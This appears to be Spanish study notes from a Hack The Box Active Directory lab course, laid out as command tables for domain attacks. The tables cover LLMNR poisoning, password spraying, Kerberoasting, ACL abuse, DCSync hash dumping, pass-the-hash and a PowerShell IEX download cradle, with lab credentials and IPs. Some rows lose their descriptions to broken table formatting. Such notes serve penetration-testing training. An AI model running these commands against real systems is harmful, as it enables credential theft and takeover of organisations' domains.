---
title: "HTB AD"
description: "Descripcion"
date: "2025-12-16"
tags: ["AD"]
---




### Enumeración Inicial

|**Comando**|**Descripción**|
|---|---|
|`nslookup ns1.inlanefreight.com`|Utilizado para consultar el sistema de nombres de dominio y descubrir la dirección IP para el mapeo del nombre de dominio del objetivo ingresado desde un host basado en Linux.|
|`sudo tcpdump -i ens224`|Utilizado para comenzar a capturar paquetes de red en la interfaz de red que precede a la opción `-i` en un host basado en Linux.|
|`sudo responder -I ens224 -A`|Utilizado para comenzar a responder y analizar consultas LLMNR, NBT-NS y MDNS en la interfaz especificada precediendo la opción `-I` y operando en modo de Análisis Pasivo que se activa usando `-A`. Realizado desde un host basado en Linux.|
|`fping -asgq 172.16.5.0/23`|Realiza un barrido de ping en el segmento de red especificado desde un host basado en Linux.|
|`sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum`|Realiza un escaneo nmap con detección de SO, detección de versión, escaneo de scripts y habilitado (`-A`) basado en una lista de hosts especificada en el archivo `hosts.txt` precediendo a `-iL`. Luego envía los resultados del escaneo al archivo especificado después de la opción `-oN`. Realizado desde un host basado en Linux.|

### Enumeración de Usuarios (Kerbrute)

|**Comando**|**Descripción**|
|---|---|
|`sudo git clone https://github.com/ropnop/kerbrute.git`|Usa git para clonar la herramienta kerbrute desde un host basado en Linux.|
|`make help`|Utilizado para listar las opciones de compilación que son posibles con `make` desde un host basado en Linux.|
|`sudo make all`|Utilizado para compilar un binario de Kerbrute para múltiples plataformas de SO y arquitecturas de CPU.|
|`./kerbrute_linux_amd64`|Utilizado para probar el binario compilado de Kerbrute elegido desde un host basado en Linux.|
|`sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`|Utilizado para mover el binario de Kerbrute a un directorio que puede configurarse para estar en la ruta (path) de un usuario de Linux. Haciendo más fácil el uso de la herramienta.|
|`./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results`|Ejecuta la herramienta Kerbrute para descubrir nombres de usuario en el dominio (`INLANEFREIGHT.LOCAL`) especificado precediendo la opción `-d` y el controlador de dominio asociado especificado precediendo `--dc` usando una lista de palabras y envía (`-o`) los resultados a un archivo especificado. Realizado desde un host basado en Linux.|

### Envenenamiento LLMNR/NBT-NS

|**Comando**|**Descripción**|
|---|---|
|`responder -h`|Utilizado para mostrar las instrucciones de uso y varias opciones disponibles en Responder desde un host basado en Linux.|
|`hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`|Usa hashcat para crackear hashes NTLMv2 (`-m`) que fueron capturados por responder y guardados en un archivo (`forend_ntlmv2`). El crackeo se realiza basado en una lista de palabras especificada.|
|`Import-Module .\Inveigh.ps1`|Usando el cmd-let `Import-Module` de PowerShell para importar la herramienta basada en Windows `Inveigh.ps1`.|
|`(Get-Command Invoke-Inveigh).Parameters`|Utilizado para mostrar muchas de las opciones y funcionalidades disponibles con `Invoke-Inveigh`. Realizado desde un host basado en Windows.|
|`Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`|Inicia Inveigh en un host basado en Windows con suplantación (spoofing) LLMNR y NBNS habilitada y envía los resultados a un archivo.|
|`.\Inveigh.exe`|Inicia la implementación en C# de Inveigh desde un host basado en Windows.|
|`$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"; Get-ChildItem $regkey|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}`|

### Rociado de Contraseñas (Password Spraying) y Políticas de Contraseñas

|**Comando**|**Descripción**|
|---|---|
|`#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $x; done`|Script de Bash utilizado para generar 16,079,616 combinaciones posibles de nombres de usuario desde un host basado en Linux.|
|`crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`|Usa CrackMapExec y credenciales válidas (`avazquez:Password123`) para enumerar la política de contraseñas (`--pass-pol`) desde un host basado en Linux.|
|`rpcclient -U "" -N 172.16.5.5`|Usa rpcclient para descubrir información sobre el dominio a través de Sesiones Nulas SMB. Realizado desde un host basado en Linux.|
|`rpcclient $> querydominfo`|Usa rpcclient para enumerar la política de contraseñas en un dominio Windows objetivo desde un host basado en Linux.|
|`enum4linux -P 172.16.5.5`|Usa enum4linux para enumerar la política de contraseñas (`-P`) en un dominio Windows objetivo desde un host basado en Linux.|
|`enum4linux-ng -P 172.16.5.5 -oA ilfreight`|Usa enum4linux-ng para enumerar la política de contraseñas (`-P`) en un dominio Windows objetivo desde un host basado en Linux, luego presenta la salida en YAML y JSON guardados en un archivo precediendo la opción `-oA`.|
|`ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*"|grep -m 1 -B 10 pwdHistoryLength`|
|`net accounts`|Utilizado para enumerar la política de contraseñas en un dominio Windows desde un host basado en Windows.|
|`Import-Module .\PowerView.ps1`|Usa el cmd-let `Import-Module` para importar la herramienta `PowerView.ps1` desde un host basado en Windows.|
|`Get-DomainPolicy`|Utilizado para enumerar la política de contraseñas en un dominio Windows objetivo desde un host basado en Windows.|
|`enum4linux -U 172.16.5.5|grep "user:"|
|`rpcclient -U "" -N 172.16.5.5` luego `rpcclient $> enumdomusers`|Usa rpcclient para descubrir cuentas de usuario en un dominio Windows objetivo desde un host basado en Linux.|
|`crackmapexec smb 172.16.5.5 --users`|Usa CrackMapExec para descubrir usuarios (`--users`) en un dominio Windows desde un host basado en Linux.|
|`ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"|grep sAMAccountName:|
|`./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`|Usa la herramienta de python windapsearch.py para descubrir usuarios en un dominio Windows objetivo desde un host basado en Linux.|
|`for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5|grep Authority; done`|
|`kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`|Usa kerbrute y una lista de usuarios (`valid_users.txt`) para realizar un ataque de rociado de contraseñas contra un dominio Windows objetivo desde un host basado en Linux.|
|`sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123|grep +`|
|`sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`|Usa CrackMapExec para validar un conjunto de credenciales desde un host basado en Linux.|
|`sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf|grep +`|
|`Import-Module .\DomainPasswordSpray.ps1`|Utilizado para importar la herramienta basada en PowerShell `DomainPasswordSpray.ps1` desde un host basado en Windows.|
|`Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`|Realiza un ataque de rociado de contraseñas y envía (`-OutFile`) los resultados a un archivo especificado (`spray_success`) desde un host basado en Windows.|

### Enumeración de Controles de Seguridad

|**Comando**|**Descripción**|
|---|---|
|`Get-MpComputerStatus`|Cmd-let de PowerShell utilizado para verificar el estado de Windows Defender Anti-Virus desde un host basado en Windows.|
|`Get-AppLockerPolicy -Effective|select -ExpandProperty RuleCollections`|
|`$ExecutionContext.SessionState.LanguageMode`|Script de PowerShell utilizado para descubrir el Modo de Lenguaje de PowerShell que se está utilizando en un host basado en Windows. Realizado desde un host basado en Windows.|
|`Find-LAPSDelegatedGroups`|Una función de LAPSToolkit que descubre Grupos Delegados de LAPS desde un host basado en Windows.|
|`Find-AdmPwdExtendedRights`|Una función de LAPSToolkit que verifica los derechos en cada computadora con LAPS habilitado para cualquier grupo con acceso de lectura y usuarios con Todos los Derechos Extendidos. Realizado desde un host basado en Windows.|
|`Get-LAPSComputers`|Una función de LAPSToolkit que busca computadoras que tienen LAPS habilitado, descubre expiración de contraseñas y puede descubrir contraseñas aleatorizadas. Realizado desde un host basado en Windows.|

### Enumeración con Credenciales

|**Comando**|**Descripción**|
|---|---|
|`xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25`|Conecta a un objetivo Windows usando credenciales válidas. Realizado desde un host basado en Linux.|
|`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`|Se autentica con un objetivo Windows a través de smb usando credenciales válidas e intenta descubrir más usuarios (`--users`) en un dominio Windows objetivo. Realizado desde un host basado en Linux.|
|`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`|Se autentica con un objetivo Windows a través de smb usando credenciales válidas e intenta descubrir grupos (`--groups`) en un dominio Windows objetivo. Realizado desde un host basado en Linux.|
|`sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users`|Se autentica con un objetivo Windows a través de smb usando credenciales válidas e intenta verificar una lista de usuarios conectados (`--loggedon-users`) en el host Windows objetivo. Realizado desde un host basado en Linux.|
|`crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`|Se autentica con un objetivo Windows a través de smb usando credenciales válidas e intenta descubrir cualquier recurso compartido smb (`--shares`). Realizado desde un host basado en Linux.|
|`crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Dev-Share'`|Se autentica con un objetivo Windows a través de smb usando credenciales válidas y utiliza el módulo (`-M`) `spider_plus` de CrackMapExec para recorrer cada recurso compartido legible (`Dev-Share`) y listar todos los archivos legibles. Los resultados se emiten en JSON. Realizado desde un host basado en Linux.|
|`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`|Enumera el dominio Windows objetivo usando credenciales válidas y lista los recursos compartidos y permisos disponibles en cada uno dentro del contexto de las credenciales válidas utilizadas y el host Windows objetivo (`-H`). Realizado desde un host basado en Linux.|
|`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'SYSVOL' --dir-only`|Enumera el dominio Windows objetivo usando credenciales válidas y realiza un listado recursivo (`-R`) del recurso compartido especificado (`SYSVOL`) y solo muestra una lista de directorios (`--dir-only`) en el recurso compartido. Realizado desde un host basado en Linux.|
|`rpcclient $> queryuser 0x457`|Enumera una cuenta de usuario objetivo en un dominio Windows usando su identificador relativo (0x457). Realizado desde un host basado en Linux.|
|`rpcclient $> enumdomusers`|Descubre cuentas de usuario en un dominio Windows objetivo y sus identificadores relativos asociados (rid). Realizado desde un host basado en Linux.|
|`psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125`|Herramienta de Impacket utilizada para conectarse a la CLI de un objetivo Windows vía el recurso administrativo ADMIN$ con credenciales válidas. Realizado desde un host basado en Linux.|
|`wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`|Herramienta de Impacket utilizada para conectarse a la CLI de un objetivo Windows vía WMI con credenciales válidas. Realizado desde un host basado en Linux.|
|`python3 windapsearch.py -h`|Utilizado para mostrar las opciones y funcionalidad de `windapsearch.py`. Realizado desde un host basado en Linux.|
|`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da`|Utilizado para enumerar el grupo de administradores de dominio (`--da`) usando un conjunto válido de credenciales en un dominio Windows objetivo. Realizado desde un host basado en Linux.|
|`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU`|Utilizado para realizar una búsqueda recursiva (`-PU`) de usuarios con permisos anidados usando credenciales válidas. Realizado desde un host basado en Linux.|
|`sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`|Ejecuta la implementación en python de BloodHound (`bloodhound.py`) con credenciales válidas y especifica un servidor de nombres (`-ns`) y un dominio Windows objetivo (`inlanefreight.local`) así como ejecuta todas las comprobaciones (`-c all`). Ejecuta usando credenciales válidas. Realizado desde un host basado en Linux.|

### Enumeración "Living Off the Land" (PowerShell AD Module)

|**Comando**|**Descripción**|
|---|---|
|`Get-Module`|Cmd-let de PowerShell utilizado para listar todos los módulos disponibles, su versión y opciones de comando desde un host basado en Windows.|
|`Import-Module ActiveDirectory`|Carga el módulo de PowerShell de Active Directory desde un host basado en Windows.|
|`Get-ADDomain`|Cmd-let de PowerShell utilizado para recopilar información del dominio Windows desde un host basado en Windows.|
|`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`|Cmd-let de PowerShell utilizado para enumerar cuentas de usuario en un dominio Windows objetivo y filtrar por `ServicePrincipalName`. Realizado desde un host basado en Windows.|
|`Get-ADTrust -Filter *`|Cmd-let de PowerShell utilizado para enumerar cualquier relación de confianza en un dominio Windows objetivo y filtra por cualquiera (`-Filter *`). Realizado desde un host basado en Windows.|
|`Get-ADGroup -Filter *|select name`|
|`Get-ADGroup -Identity "Backup Operators"`|Cmd-let de PowerShell utilizado para buscar un grupo específico (`-Identity "Backup Operators"`). Realizado desde un host basado en Windows.|
|`Get-ADGroupMember -Identity "Backup Operators"`|Cmd-let de PowerShell utilizado para descubrir los miembros de un grupo específico (`-Identity "Backup Operators"`). Realizado desde un host basado en Windows.|

### Enumeración con PowerView

|**Comando**|**Descripción**|
|---|---|
|`Export-PowerViewCSV`|Script de PowerView utilizado para anexar resultados a un archivo csv. Realizado desde un host basado en Windows.|
|`ConvertTo-SID`|Script de PowerView utilizado para convertir un nombre de usuario o grupo a su SID. Realizado desde un host basado en Windows.|
|`Get-DomainSPNTicket`|Script de PowerView utilizado para solicitar el ticket kerberos para un nombre principal de servicio (SPN) especificado. Realizado desde un host basado en Windows.|
|`Get-Domain`|Script de PowerView utilizado para devolver el objeto AD para el dominio actual (o especificado). Realizado desde un host basado en Windows.|
|`Get-DomainController`|Script de PowerView utilizado para devolver una lista de los controladores de dominio objetivo para el dominio objetivo especificado. Realizado desde un host basado en Windows.|
|`Get-DomainUser`|Script de PowerView utilizado para devolver todos los usuarios u objetos de usuario específicos en AD. Realizado desde un host basado en Windows.|
|`Get-DomainComputer`|Script de PowerView utilizado para devolver todas las computadoras u objetos de computadora específicos en AD. Realizado desde un host basado en Windows.|
|`Get-DomainGroup`|Script de PowerView utilizado para devolver todos los grupos u objetos de grupo específicos en AD. Realizado desde un host basado en Windows.|
|`Get-DomainOU`|Script de PowerView utilizado para buscar todos o específicos objetos OU en AD. Realizado desde un host basado en Windows.|
|`Find-InterestingDomainAcl`|Script de PowerView utilizado para encontrar ACLs de objetos en el dominio con derechos de modificación establecidos en objetos no integrados. Realizado desde un host basado en Windows.|
|`Get-DomainGroupMember`|Script de PowerView utilizado para devolver los miembros de un grupo de dominio específico. Realizado desde un host basado en Windows.|
|`Get-DomainFileServer`|Script de PowerView utilizado para devolver una lista de servidores que probablemente funcionan como servidores de archivos. Realizado desde un host basado en Windows.|
|`Get-DomainDFSShare`|Script de PowerView utilizado para devolver una lista de todos los sistemas de archivos distribuidos para el dominio actual (o especificado). Realizado desde un host basado en Windows.|
|`Get-DomainGPO`|Script de PowerView utilizado para devolver todos los GPOs u objetos GPO específicos en AD. Realizado desde un host basado en Windows.|
|`Get-DomainPolicy`|Script de PowerView utilizado para devolver la política de dominio predeterminada o la política del controlador de dominio para el dominio actual. Realizado desde un host basado en Windows.|
|`Get-NetLocalGroup`|Script de PowerView utilizado para enumerar grupos locales en una máquina local o remota. Realizado desde un host basado en Windows.|
|`Get-NetLocalGroupMember`|Script de PowerView utilizado para enumerar miembros de un grupo local específico. Realizado desde un host basado en Windows.|
|`Get-NetShare`|Script de PowerView utilizado para devolver una lista de recursos compartidos abiertos en una máquina local (o remota). Realizado desde un host basado en Windows.|
|`Get-NetSession`|Script de PowerView utilizado para devolver información de sesión para la máquina local (o remota). Realizado desde un host basado en Windows.|
|`Test-AdminAccess`|Script de PowerView utilizado para probar si el usuario actual tiene acceso administrativo a la máquina local (o remota). Realizado desde un host basado en Windows.|
|`Find-DomainUserLocation`|Script de PowerView utilizado para encontrar máquinas donde usuarios específicos han iniciado sesión. Realizado desde un host basado en Windows.|
|`Find-DomainShare`|Script de PowerView utilizado para encontrar recursos compartidos alcanzables en máquinas del dominio. Realizado desde un host basado en Windows.|
|`Find-InterestingDomainShareFile`|Script de PowerView que busca archivos que coinciden con criterios específicos en recursos compartidos legibles en el dominio. Realizado desde un host basado en Windows.|
|`Find-LocalAdminAccess`|Script de PowerView utilizado para encontrar máquinas en el dominio local donde el usuario actual tiene acceso de administrador local. Realizado desde un host basado en Windows.|
|`Get-DomainTrust`|Script de PowerView que devuelve confianzas de dominio para el dominio actual o un dominio especificado. Realizado desde un host basado en Windows.|
|`Get-ForestTrust`|Script de PowerView que devuelve todas las confianzas de bosque para el bosque actual o un bosque especificado. Realizado desde un host basado en Windows.|
|`Get-DomainForeignUser`|Script de PowerView que enumera usuarios que están en grupos fuera del dominio del usuario. Realizado desde un host basado en Windows.|
|`Get-DomainForeignGroupMember`|Script de PowerView que enumera grupos con usuarios fuera del dominio del grupo y devuelve cada miembro extranjero. Realizado desde un host basado en Windows.|
|`Get-DomainTrustMapping`|Script de PowerView que enumera todas las confianzas para el dominio actual y cualquier otro visto. Realizado desde un host basado en Windows.|
|`Get-DomainGroupMember -Identity "Domain Admins" -Recurse`|Script de PowerView utilizado para listar todos los miembros de un grupo objetivo ("Domain Admins") mediante el uso de la opción recurse (`-Recurse`). Realizado desde un host basado en Windows.|
|`Get-DomainUser -SPN -Properties samaccountname, ServicePrincipalName`|Script de PowerView utilizado para encontrar usuarios en el dominio Windows objetivo que tienen el Nombre Principal de Servicio establecido. Realizado desde un host basado en Windows.|
|`.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data`|Ejecuta una herramienta llamada Snaffler contra un dominio Windows objetivo que encuentra varios tipos de datos en recursos compartidos a los que la cuenta comprometida tiene acceso. Realizado desde un host basado en Windows.|

### Transferencia de Archivos

|**Comando**|**Descripción**|
|---|---|
|`sudo python3 -m http.server 8001`|Inicia un servidor web python para alojamiento rápido de archivos. Realizado desde un host basado en Linux.|
|`"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"`|One-liner de PowerShell utilizado para descargar un archivo desde un servidor web. Realizado desde un host basado en Windows.|
|`sudo impacket-smbserver share -smb2support /home/administrator/Downloads/`|Inicia un servidor SMB impacket para alojamiento rápido de un archivo. Realizado desde un host basado en Linux.|

### Kerberoasting

|**Comando**|**Descripción**|
|---|---|
|`sudo python3 -m pip install .`|Utilizado para instalar Impacket desde dentro del directorio que se clona al host de ataque. Realizado desde un host basado en Linux.|
|`GetUserSPNs.py -h`|Herramienta de Impacket utilizada para mostrar las opciones y funcionalidad de `GetUserSPNs.py` desde un host basado en Linux.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday`|Herramienta de Impacket utilizada para obtener una lista de SPNs en el dominio Windows objetivo desde un host basado en Linux.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request`|Herramienta de Impacket utilizada para descargar/solicitar (`-request`) todos los tickets TGS para procesamiento offline desde un host basado en Linux.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev`|Herramienta de Impacket utilizada para descargar/solicitar (`-request-user`) un ticket TGS para una cuenta de usuario específica (`sqldev`) desde un host basado en Linux.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs`|Herramienta de Impacket utilizada para descargar/solicitar un ticket TGS para una cuenta de usuario específica y escribir el ticket a un archivo (`-outputfile sqldev_tgs`) desde un host basado en Linux.|
|`hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force`|Intenta crackear el hash del ticket Kerberos (`-m 13100`) (`sqldev_tgs`) usando hashcat y una lista de palabras (`rockyou.txt`) desde un host basado en Linux.|
|`setspn.exe -Q */*`|Utilizado para enumerar SPNs en un dominio Windows objetivo desde un host basado en Windows.|
|`Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`|Script de PowerShell utilizado para descargar/solicitar el ticket TGS de un usuario específico desde un host basado en Windows.|
|`setspn.exe -T INLANEFREIGHT.LOCAL -Q _/_|Select-String '^CN' -Context 0,1|
|`mimikatz # base64 /out:true`|Comando de Mimikatz que asegura que los tickets TGS se extraigan en formato base64 desde un host basado en Windows.|
|`mimikatz # kerberos::list /export`|Comando de Mimikatz utilizado para extraer los tickets TGS desde un host basado en Windows.|
|`echo ""|tr -d \n`|
|`cat encoded_file|base64 -d > sqldev.kirbi`|
|`python2.7 kirbi2john.py sqldev.kirbi`|Utilizado para extraer el ticket Kerberos. Esto también crea un archivo llamado `crack_file` desde un host basado en Linux.|
|`sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`|Utilizado para modificar el `crack_file` para Hashcat desde un host basado en Linux.|
|`cat sqldev_tgs_hashcat`|Utilizado para ver el hash preparado desde un host basado en Linux.|
|`hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`|Utilizado para crackear el hash del ticket Kerberos preparado (`sqldev_tgs_hashcat`) usando una lista de palabras (`rockyou.txt`) desde un host basado en Linux.|
|`Import-Module .\PowerView.ps1` seguido de `Get-DomainUser * -spn|select samaccountname`|
|`Get-DomainUser -Identity sqldev|Get-DomainSPNTicket -Format Hashcat`|
|`Get-DomainUser -SPN|Get-DomainSPNTicket -Format Hashcat|
|`cat .\ilfreight_tgs.csv`|Utilizado para ver el contenido del archivo .csv desde un host basado en Windows.|
|`.\Rubeus.exe`|Utilizado para ver las opciones y funcionalidad posibles con la herramienta Rubeus. Realizado desde un host basado en Windows.|
|`.\Rubeus.exe kerberoast /stats`|Utilizado para verificar las estadísticas de kerberoast (`/stats`) dentro del dominio Windows objetivo desde un host basado en Windows.|
|`.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`|Utilizado para solicitar/descargar tickets TGS para cuentas con el recuento de administrador establecido en 1, luego formatea la salida de una manera fácil de ver (`/nowrap`). Realizado desde un host basado en Windows.|
|`.\Rubeus.exe kerberoast /user:testspn /nowrap`|Utilizado para solicitar/descargar un ticket TGS para un usuario específico (`/user:testspn`) luego formatea la salida de una manera fácil de ver y crackear (`/nowrap`). Realizado desde un host basado en Windows.|
|`Get-DomainUser testspn -Properties samaccountname, serviceprincipalname, msds-supportedencryptiontypes`|Herramienta de PowerView utilizada para verificar el atributo `msds-supportedencryptiontypes` asociado con una cuenta de usuario específica (`testspn`). Realizado desde un host basado en Windows.|
|`hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt`|Utilizado para intentar crackear el hash del ticket usando una lista de palabras (`rockyou.txt`) desde un host basado en Linux.|

### Enumeración y Tácticas de ACL

|**Comando**|**Descripción**|
|---|---|
|`Find-InterestingDomainAcl`|Herramienta de PowerView utilizada para encontrar ACLs de objetos en el dominio Windows objetivo con derechos de modificación establecidos en objetos no integrados desde un host basado en Windows.|
|`Import-Module .\PowerView.ps1` seguido de `$sid = Convert-NameToSid wley`|Utilizado para importar PowerView y recuperar el SID de una cuenta de usuario específica (`wley`) desde un host basado en Windows.|
|`Get-DomainObjectACL -Identity *|? {$_.SecurityIdentifier -eq $sid}`|
|`$guid= "00299570-246d-11d0-a768-00aa006e0529"` seguido de `Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties *|Select Name, DisplayName, DistinguishedName, rightsGuid|
|`Get-DomainObjectACL -ResolveGUIDS -Identity *|? {$_.SecurityIdentifier -eq $sid}`|
|`Get-ADUser -Filter *|Select-Object -ExpandProperty SamAccountName > ad_users.txt`|
|`foreach ($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:$(Get-ADUser $line)"|Select-Object Path -ExpandProperty Access|
|`$SecPassword = ConvertTo-SecureString <PASSWORD HERE> -AsPlainText -Force`|Utilizado para crear un Objeto SecureString desde un host basado en Windows.|
|`$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`|Utilizado para crear un Objeto PSCredential desde un host basado en Windows.|
|`Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`|Herramienta de PowerView utilizada para cambiar la contraseña de un usuario específico (`damundsen`) en un dominio Windows objetivo desde un host basado en Windows.|
|`Get-ADGroup -Identity "Help Desk Level 1" -Properties Members|Select -ExpandProperty Members`|
|`Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`|Herramienta de PowerView utilizada para añadir un usuario específico (`damundsen`) a un grupo de seguridad específico (`Help Desk Level 1`) en un dominio Windows objetivo desde un host basado en Windows.|
|`Get-DomainGroupMember -Identity "Help Desk Level 1"|Select MemberName`|
|`Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`1|Herramienta de PowerView utilizada para crear un Nombre Principal de Servicio falso dado un usuario específico (`adunn`) desde un host basado en Windows.2|
|`Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`|Herramienta de PowerView utilizada para eliminar el Nombre Principal de Servicio falso creado durante el ataque desde un host basado en Windows.|
|`Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`|Herramienta de PowerView utilizada para eliminar un usuario específico (`damundsen`) de un grupo de seguridad específico (`Help Desk Level 1`) desde un host basado en Windows.|
|`ConvertFrom-SddlString`|Cmd-let de PowerShell utilizado para convertir una cadena SDDL a un formato legible. Realizado desde un host basado en Windows.|

### DCSync

|**Comando**|**Descripción**|
|---|---|
|`Get-DomainUser -Identity adunn|select samaccountname, objectsid, memberof, useraccountcontrol|
|`$sid = "1-5-21-3842939050-3880317879-2865463114-1164"` seguido de `Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDS|? { ($_.ObjectAceType -match 'Replication-Get')}|
|`secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss`|Herramienta de Impacket utilizada para extraer hashes NTLM del archivo NTDS.dit alojado en un Controlador de Dominio objetivo (172.16.5.5) y guardar los hashes extraídos en un archivo (`inlanefreight_hashes`). Realizado desde un host basado en Linux.|
|`mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`|Usa Mimikatz para realizar un ataque dcsync desde un host basado en Windows.|

### Acceso Privilegiado y MSSQL

|**Comando**|**Descripción**|
|---|---|
|`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`|Herramienta basada en PowerView utilizada para enumerar el grupo de Usuarios de Escritorio Remoto en un objetivo Windows (`-ComputerName ACADEMY-EA-MS01`) desde un host basado en Windows.|
|`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"`|Herramienta basada en PowerView utilizada para enumerar el grupo de Usuarios de Administración Remota en un objetivo Windows (`-ComputerName ACADEMY-EA-MS01`) desde un host basado en Windows.|
|`$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force`|Crea una variable (`$password`) establecida igual a la contraseña (`Klmcargo2`) de un usuario desde un host basado en Windows.|
|`$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)`|Crea una variable (`$cred`) establecida igual al nombre de usuario (`forend`) y contraseña (`$password`) de una cuenta de dominio objetivo desde un host basado en Windows.|
|`Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred`|Usa el cmd-let de PowerShell `Enter-PSSession` para establecer una sesión de PowerShell con un objetivo a través de la red (`-ComputerName ACADEMY-EA-DB01`) desde un host basado en Windows. Se autentica usando credenciales hechas en los 2 comandos mostrados anteriormente.|
|`evil-winrm -i 10.129.201.234 -u forend -p Klmcargo2`|Utilizado para establecer una sesión de PowerShell con un objetivo Windows desde un host basado en Linux usando WinRM.|
|`Import-Module .\PowerUpSQL.ps1`|Utilizado para importar la herramienta PowerUpSQL.|
|`Get-SQLInstanceDomain`|Herramienta PowerUpSQL utilizada para enumerar instancias de servidor SQL desde un host basado en Windows.|
|`Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'`|Herramienta PowerUpSQL utilizada para conectarse a un servidor SQL y consultar la versión (`-query 'Select @@version'`) desde un host basado en Windows.|
|`mssqlclient.py -h`|Herramienta de Impacket utilizada para mostrar la funcionalidad y opciones proporcionadas con `mssqlclient.py` desde un host basado en Linux.|
|`mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`|Herramienta de Impacket utilizada para conectarse a un servidor MSSQL desde un host basado en Linux.|
|`SQL> help`|Utilizado para mostrar opciones de `mssqlclient.py` una vez conectado a un servidor MSSQL.|
|`SQL> enable_xp_cmdshell`|Utilizado para habilitar el procedimiento almacenado `xp_cmdshell` que permite ejecutar comandos del SO a través de la base de datos desde un host basado en Linux.|
|`xp_cmdshell whoami /priv`|Utilizado para enumerar derechos en un sistema usando `xp_cmdshell`.|

### NoPac, PrintNightmare y PetitPotam

|**Comando**|**Descripción**|
|---|---|
|`sudo git clone https://github.com/Ridter/noPac.git`|Utilizado para clonar un exploit noPac usando git. Realizado desde un host basado en Linux.|
